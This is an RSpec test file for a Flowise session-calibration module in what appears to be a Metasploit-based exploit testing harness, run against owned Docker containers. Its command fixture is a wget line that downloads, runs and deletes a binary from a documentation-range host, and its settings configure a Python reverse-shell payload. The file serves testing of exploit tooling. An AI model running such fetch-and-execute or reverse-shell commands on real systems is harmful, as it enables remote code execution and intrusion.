require 'spec_helper'
require 'tmpdir'
require_relative '../../../test/module_targets/flowise/native_session_calibration'

RSpec.describe FlowiseNativeSessionCalibration do
  let(:command) { 'wget -qO /tmp/native http://192.0.2.10:8095/native;chmod +x /tmp/native;/tmp/native&sleep 3;rm -rf /tmp/native' }
  let(:payload) { double('Actual payload instance', refname: described_class::PAYLOAD, datastore: described_class.settings('192.0.2.10')) }
  let(:encoded) { double('Already generated EncodedPayload', encoded: command) }
  let(:handler) { double('Executing handler', fullname: 'exploit/multi/handler', payload_instance: payload, payload: encoded) }
  let(:job) { double('Actual handler job', ctx: [handler, payload]) }
  let(:shell_exit_command) { "irb -e #{'framework.sessions[23].shell_write("exit\n")'.inspect}" }
  let(:harness_class) do
    Class.new do
      include RSpec::Matchers
      include FlowiseNativeSessionCalibration

      attr_reader :records

      def initialize(directory)
        @directory = directory
        @records = []
        @profile = 'flowise_300'
      end

      def artifact(name)
        File.join(@directory, name)
      end

      def target_runtime
        { 'compose' => %w[docker compose --project-name owned] }
      end

      def native(*)
        {}
      end

      def console
        Struct.new(:all_data).new('Actual calibration transcript')
      end

      def record(name, values)
        @records << [name, values.dup]
      end

      def target_exec(*)
        ''
      end

      def console_command(*)
        ''
      end

      def wait_target(_timeout)
        yield
      end
    end
  end

  around do |example|
    Dir.mktmpdir('flowise-calibration-') do |directory|
      @directory = directory
      example.run
    end
  end

  let(:harness) { harness_class.new(@directory) }

  it 'reads the executing cached command once without invoking payload generation' do
    expect(encoded).to receive(:encoded).once.and_return(command)
    expect(payload).not_to receive(:generate)
    expect(payload).not_to receive(:encoded)
    result = described_class.cached_command(job)
    expect(Base64.strict_decode64(result.fetch('command_base64'))).to eq(command)
    expect(result.fetch('command_sha256')).to eq(Digest::SHA256.hexdigest(command))
  end

  it 'rejects a different executing owner before reading its payload' do
    allow(handler).to receive(:fullname).and_return('exploit/test/other')
    expect(encoded).not_to receive(:encoded)
    expect { described_class.cached_command(job) }.to raise_error(ArgumentError, 'Unexpected native handler context')
  end

  it 'rejects a payload instance detached from the real executing handler' do
    allow(handler).to receive(:payload_instance).and_return(Object.new)
    expect { described_class.cached_command(job) }.to raise_error(ArgumentError, 'Unexpected native handler context')
  end

  it 'rejects missing generated command bytes instead of generating a substitute' do
    allow(encoded).to receive(:encoded).and_return(nil)
    expect { described_class.cached_command(job) }.to raise_error(ArgumentError, 'Missing generated native command')
  end

  it 'keeps calibration listeners distinct from both owning delivery ports' do
    options = described_class.settings('192.0.2.10')
    expect(options.values_at('LPORT', 'FETCH_SRVPORT')).to eq([4455, 8095])
    expect(options.values_at('LPORT', 'FETCH_SRVPORT') & [4444, 8081]).to eq([])
    expect(options).to include('FETCH_COMMAND' => 'WGET', 'FETCH_DELETE' => true, 'PAYLOAD' => described_class::PAYLOAD, 'FETCH_URIPATH' => described_class::FETCH_NAME)
  end

  it 'selects the actual Python shell family without fetch or generic command options' do
    expect(described_class.python_settings('192.0.2.10')).to eq(
      'PAYLOAD' => 'cmd/unix/reverse_python', 'LHOST' => '192.0.2.10', 'LPORT' => 4456,
      'PythonPath' => '/usr/bin/python3', 'SHELL' => '/bin/sh',
      'DisablePayloadHandler' => false, 'ExitOnSession' => false,
      'ListenerTimeout' => 60, 'VERBOSE' => true
    )
  end

  it 'reads the actual Python executing context once and preserves its cached command bytes' do
    python_command = 'echo actual_cached_stub | /usr/bin/python3  -'
    allow(payload).to receive(:refname).and_return(described_class::PYTHON_PAYLOAD)
    allow(payload).to receive(:datastore).and_return(described_class.python_settings('192.0.2.10'))
    expect(encoded).to receive(:encoded).once.and_return(python_command)
    expect(payload).not_to receive(:generate)
    expect(payload).not_to receive(:encoded)
    result = described_class.cached_command(job, described_class::PYTHON_PAYLOAD)
    expect(Base64.strict_decode64(result.fetch('command_base64'))).to eq(python_command)
    expect(result).to include('payload' => described_class::PYTHON_PAYLOAD, 'settings' => described_class.python_settings('192.0.2.10'), 'command_sha256' => Digest::SHA256.hexdigest(python_command))
  end

  it 'rejects an unsupported calibration family before reading the handler context' do
    expect(job).not_to receive(:ctx)
    expect { described_class.cached_command(job, 'cmd/unix/generic') }.to raise_error(ArgumentError, 'Unsupported native calibration payload')
  end

  it 'rejects a fetch executing context when Python calibration was requested' do
    expect(encoded).not_to receive(:encoded)
    expect { described_class.cached_command(job, described_class::PYTHON_PAYLOAD) }.to raise_error(ArgumentError, 'Unexpected native handler context')
  end

  it 'delegates command execution to the existing bounded process-group executor' do
    runner = described_class::CommandRunner.new
    argv = %w[docker compose exec -T app id -u]
    expect(runner).to receive(:command).with(argv, path: '/tmp/owned-log', timeout: 40, capture: an_instance_of(String), quiet: true) do |actual, **options|
      expect(actual).to equal(argv)
      options.fetch(:capture) << "0\n"
      true
    end
    expect(runner.capture(argv, path: '/tmp/owned-log')).to eq(passed: true, output: "0\n")
  end

  it 'propagates the existing command timeout without retrying a native launch' do
    runner = described_class::CommandRunner.new
    expect(runner).to receive(:command).once.and_raise(Timeout::Error, 'Actual command deadline')
    expect { runner.capture(['docker', 'exec'], path: '/tmp/owned-log') }.to raise_error(Timeout::Error, 'Actual command deadline')
  end

  it 'preserves the native exec service and argument bytes through the adapter' do
    command_bytes = 'Actual quoted $command; bytes'
    expect(harness).to receive(:native_flowise_cli).with('docker', 'compose', '--project-name', 'owned', 'exec', '-T', 'app', 'sh', '-c', command_bytes).and_return('Actual peer output')
    expect(harness.send(:native_flowise_exec, 'app', 'sh', '-c', command_bytes)).to eq('Actual peer output')
  end

  it 'records a failed command as setup failure without inventing an exit code' do
    runner = double('Bounded command runner')
    harness.instance_variable_set(:@native_flowise_commands, runner)
    expect(runner).to receive(:capture).with(['docker', 'exec'], path: harness.artifact('native-payload-cli.log')).and_return(passed: false, output: 'Actual native error')
    expect { harness.send(:native_flowise_cli, 'docker', 'exec') }.to raise_error(RSpec::Expectations::ExpectationNotMetError, 'Actual native error')
    expect(harness.records.last.last).to eq(argv: ['docker', 'exec'], passed: false, output: 'Actual native error')
  end

  it 'copies exact command bytes and verifies actual application owner mode and SHA' do
    digest = Digest::SHA256.hexdigest(command)
    expect(harness).to receive(:native_flowise_exec).with('app', 'sh', '-c', 'test ! -e "$1" && test ! -L "$1"', 'sh', described_class::REMOTE_COMMAND).ordered.and_return('')
    expect(harness).to receive(:native_flowise_cli).with('docker', 'compose', '--project-name', 'owned', 'cp', harness.artifact('native-payload-command.raw'), "app:#{described_class::REMOTE_COMMAND}").ordered do
      expect(File.binread(harness.artifact('native-payload-command.raw'))).to eq(command)
      expect(File.stat(harness.artifact('native-payload-command.raw')).mode & 0o777).to eq(0o600)
    end
    expect(harness).to receive(:native_flowise_exec).with('app', 'stat', '-c', '%u:%g:%a', described_class::REMOTE_COMMAND).ordered.and_return("503:20:600\n")
    expect(harness).to receive(:native_flowise_exec).with('app', 'sha256sum', described_class::REMOTE_COMMAND).ordered.and_return("#{digest}  #{described_class::REMOTE_COMMAND}\n")
    expect(harness).to receive(:native_flowise_exec).with('app', 'chown', '0:0', described_class::REMOTE_COMMAND).ordered.and_return('')
    expect(harness).to receive(:native_flowise_exec).with('app', 'chmod', '600', described_class::REMOTE_COMMAND).ordered.and_return('')
    expect(harness).to receive(:native_flowise_exec).with('app', 'stat', '-c', '%u:%g:%a', described_class::REMOTE_COMMAND).ordered.and_return("0:0:600\n")
    expect(harness).to receive(:native_flowise_exec).with('app', 'sha256sum', described_class::REMOTE_COMMAND).ordered.and_return("#{digest}  #{described_class::REMOTE_COMMAND}\n")
    result = harness.send(:native_flowise_install_command, command, digest, '0', '0')
    expect(result).to include(copied_owner_mode: '503:20:600', copied_sha256: digest, owner_mode: '0:0:600', sha256: digest)
    expect(harness.records.map(&:last)).to eq([
      { phase: 'copied', path: described_class::REMOTE_COMMAND, owner_mode: '503:20:600', sha256: digest },
      { phase: 'prepared', path: described_class::REMOTE_COMMAND, owner_mode: '0:0:600', sha256: digest }
    ])
  end

  it 'refuses an existing or symlink target name before any copy' do
    allow(harness).to receive(:native_flowise_exec).and_raise(RuntimeError, 'Existing target name')
    expect(harness).not_to receive(:native_flowise_cli)
    expect { harness.send(:native_flowise_install_command, command, 'unused', '0', '0') }.to raise_error(RuntimeError, 'Existing target name')
  end

  it 'preserves copied metadata and fails setup when numeric owner preparation is denied' do
    digest = Digest::SHA256.hexdigest(command)
    allow(harness).to receive(:native_flowise_exec).and_return('')
    allow(harness).to receive(:native_flowise_cli).and_return('')
    allow(harness).to receive(:native_flowise_exec).with('app', 'stat', '-c', '%u:%g:%a', described_class::REMOTE_COMMAND).and_return("503:20:600\n")
    allow(harness).to receive(:native_flowise_exec).with('app', 'sha256sum', described_class::REMOTE_COMMAND).and_return("#{digest}  #{described_class::REMOTE_COMMAND}\n")
    expect(harness).to receive(:native_flowise_exec).with('app', 'chown', '0:0', described_class::REMOTE_COMMAND).and_raise(RSpec::Expectations::ExpectationNotMetError, 'Actual chown denied')
    expect(harness).not_to receive(:native_flowise_exec).with('app', 'chmod', '600', described_class::REMOTE_COMMAND)
    expect { harness.send(:native_flowise_install_command, command, digest, '0', '0') }.to raise_error(RSpec::Expectations::ExpectationNotMetError, 'Actual chown denied')
    expect(harness.records.map(&:last)).to eq([{ phase: 'copied', path: described_class::REMOTE_COMMAND, owner_mode: '503:20:600', sha256: digest }])
  end

  it 'refuses to overwrite a local calibration artifact before native copy' do
    File.write(harness.artifact('native-payload-command.raw'), 'Preserved original')
    expect(harness).to receive(:native_flowise_exec).with('app', 'sh', '-c', 'test ! -e "$1" && test ! -L "$1"', 'sh', described_class::REMOTE_COMMAND).and_return('')
    expect(harness).not_to receive(:native_flowise_cli)
    expect { harness.send(:native_flowise_install_command, command, 'unused', '0', '0') }.to raise_error(Errno::EEXIST)
    expect(File.read(harness.artifact('native-payload-command.raw'))).to eq('Preserved original')
  end

  it 'runs owned cleanup and records setup attribution after a calibration failure' do
    allow(harness).to receive(:native_flowise_fetch_run).and_raise(IOError, 'Actual native failure')
    expect(harness).to receive(:native_flowise_calibration_cleanup).once
    expect { harness.calibrate_native_flowise_fetch }.to raise_error(IOError, 'Actual native failure')
    expect(harness.records.last.last).to include(status: 'setup_failed', module_verdict: nil, cleanup: 'passed', failure: 'IOError: Actual native failure')
  end

  it 'keeps Python failure attribution separate from an owning module verdict' do
    allow(harness).to receive(:native_flowise_python_run).and_raise(IOError, 'Actual native Python failure')
    expect(harness).not_to receive(:native_flowise_fetch_run)
    expect(harness).to receive(:native_flowise_calibration_cleanup).once
    expect { harness.calibrate_native_flowise_python }.to raise_error(IOError, 'Actual native Python failure')
    expect(harness.records.last.last).to include(payload: described_class::PYTHON_PAYLOAD, status: 'setup_failed', module_verdict: nil, cleanup: 'passed', failure: 'IOError: Actual native Python failure')
  end

  it 'requires every native Python ancestry PID absent before closing its host socket' do
    expect(harness).to receive(:console_command).with(shell_exit_command).ordered
    expect(harness).to receive(:native_flowise_exec).with('app', 'sh', '-c', 'if test -e "$1";then printf PRESENT;else printf ABSENT;fi', 'sh', '/proc/741').ordered.and_return('ABSENT')
    expect(harness).to receive(:native_flowise_exec).with('app', 'sh', '-c', 'if test -e "$1";then printf PRESENT;else printf ABSENT;fi', 'sh', '/proc/740').ordered.and_return('ABSENT')
    expect(harness).to receive(:console_command).with('irb -e "framework.sessions[23]&.shell_close"').ordered
    expect(harness).to receive(:console_command).with('sessions -l').ordered.and_return('No active sessions')
    harness.send(:native_flowise_close_shell, 23, [{ 'pid' => 741 }, { 'pid' => 740 }])
  end

  it 'does not credit host closure as graceful shutdown while a target PID remains' do
    expect(harness).to receive(:console_command).with(shell_exit_command).once
    expect(harness).to receive(:native_flowise_exec).with('app', 'sh', '-c', 'if test -e "$1";then printf PRESENT;else printf ABSENT;fi', 'sh', '/proc/741').and_return('PRESENT')
    expect(harness).not_to receive(:console_command).with('irb -e "framework.sessions[23]&.shell_close"')
    expect { harness.send(:native_flowise_close_shell, 23, [{ 'pid' => 741 }]) }.to raise_error(RSpec::Expectations::ExpectationNotMetError)
  end

  it 'does not report success when cleanup fails after successful session proof' do
    allow(harness).to receive(:native_flowise_fetch_run)
    allow(harness).to receive(:native_flowise_calibration_cleanup).and_raise(IOError, 'Actual cleanup failure')
    expect { harness.calibrate_native_flowise_fetch }.to raise_error(IOError, 'Actual cleanup failure')
    expect(harness.records.last.last).to include(status: 'setup_failed', cleanup: 'failed', cleanup_failure: 'IOError: Actual cleanup failure')
  end

  it 'stops only the known native job and closes only the known native session' do
    before = { 'files' => {} }
    harness.instance_variable_set(:@native_calibration_session, 23)
    harness.instance_variable_set(:@native_calibration_job, '7')
    harness.instance_variable_set(:@native_calibration_state, before)
    harness.instance_variable_set(:@native_calibration, {})
    expect(harness).to receive(:console_command).with('irb -e "framework.sessions[23]&.kill"').ordered
    expect(harness).to receive(:console_command).with('irb -e "framework.jobs.stop_job(\"7\")"').ordered
    expect(harness).to receive(:native).with(action: 'restore_state', before: before).ordered.and_return('restored' => before)
    harness.send(:native_flowise_calibration_cleanup)
    expect(harness.instance_variable_get(:@native_calibration_job)).to be_nil
  end
end
